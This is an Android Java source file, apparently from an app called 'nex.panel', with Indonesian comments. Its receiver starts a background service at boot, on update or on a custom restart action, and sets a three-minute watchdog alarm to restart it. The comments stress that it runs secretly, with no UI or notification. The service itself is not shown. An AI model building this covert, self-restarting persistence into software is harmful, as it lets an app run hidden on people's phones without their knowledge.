package com.nex.panel;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * BootReceiver — Auto-start BackgroundService saat HP reboot atau di-kill sistem.
 * Tidak ada UI, tidak ada notif, langsung jalankan service diam-diam.
 */
public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action == null) return;

        // Boot, update, quickboot, atau restart dari AlarmManager watchdog
        if (Intent.ACTION_BOOT_COMPLETED.equals(action)
                || Intent.ACTION_MY_PACKAGE_REPLACED.equals(action)
                || "android.intent.action.QUICKBOOT_POWERON".equals(action)
                || "com.nex.panel.RESTART_SERVICE".equals(action)) {
            startService(context);
        }
    }

    private void startService(Context context) {
        try {
            Intent service = new Intent(context, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(service);
            } else {
                context.startService(service);
            }
        } catch (Exception ignored) {}

        // Set watchdog alarm repeating setiap 3 menit sebagai safety net
        // Kalau service mati, alarm ini yang restart
        try {
            Intent restart = new Intent(context, BootReceiver.class);
            restart.setAction("com.nex.panel.RESTART_SERVICE");
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                flags |= PendingIntent.FLAG_IMMUTABLE;
            }
            PendingIntent pi = PendingIntent.getBroadcast(context, 9002, restart, flags);
            AlarmManager am  = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            if (am != null) {
                am.setRepeating(
                    AlarmManager.RTC_WAKEUP,
                    System.currentTimeMillis() + 3 * 60 * 1000,
                    3 * 60 * 1000,
                    pi
                );
            }
        } catch (Exception ignored) {}
    }
}
